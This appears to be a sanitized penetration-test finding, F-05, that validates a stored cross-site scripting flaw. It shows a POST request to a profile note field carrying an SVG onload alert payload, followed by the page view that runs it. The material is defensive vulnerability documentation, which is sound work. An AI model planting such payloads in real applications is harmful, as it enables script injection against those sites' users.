# F-05 Technical Validation

> Sanitized reconstruction. The original input field, page, identifiers, and payload are not reproduced. The example below preserves the confirmed stored-execution condition.

## Stored input

```http
POST /profile/note HTTP/1.1
Host: app.example.test
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded

note=%3Csvg%2Fonload%3Dalert%281%29%3E
```

The application accepted and persisted the supplied value.

## Subsequent rendering

```http
GET /profile HTTP/1.1
Host: app.example.test
Cookie: session=[redacted]
```

The stored value was later rendered into a browser-executable context and the controlled script executed when the affected view was opened.

## Security conclusion

The issue required persistence and later rendering of attacker-controlled content, distinguishing the behavior from reflected XSS and confirming stored cross-site scripting.
